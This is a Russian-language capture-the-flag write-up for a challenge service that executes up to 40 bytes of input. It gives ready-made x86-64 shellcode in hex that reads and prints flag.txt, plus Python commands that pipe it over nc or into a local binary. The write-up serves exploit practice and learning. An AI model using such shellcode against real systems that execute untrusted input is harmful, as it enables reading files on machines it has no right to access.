# shellcode — writeup

## Идея
Сервис читает до 40 байт и исполняет их как код.

Функции `get_flag()` нет. Флаг лежит в `./flag.txt`.

## Решение
Пишем небольшой x86-64 shellcode, который:
1) `open("flag.txt", O_RDONLY)`
2) `read(fd, buf, 0x40)`
3) `write(1, buf, 0x40)`

Важно уложиться в 40 байт.

## Payload (40 bytes)
Ниже — готовые байты (hex), которые печатают `flag.txt`:

```text
31c0 99 50 48bb666c61672e747874 53 545f 31f6 b002 0f05 89c7 545e b240 31c0 0f05 6a015f b001 0f05
```

В виде команды:

```bash
python3 - <<'PY' | nc <host> <port>
import sys
sc = bytes.fromhex(
  '31c0995048bb666c61672e74787453545f31f6b0020f0589c7545eb24031c00f056a015fb0010f05'
)
assert len(sc) <= 40
sys.stdout.buffer.write(sc)
PY
```

Локально (если рядом положили `flag.txt`):

```bash
python3 - <<'PY' | ./shellcode
import sys
sc = bytes.fromhex('31c0995048bb666c61672e74787453545f31f6b0020f0589c7545eb24031c00f056a015fb0010f05')
sys.stdout.buffer.write(sc)
PY
```
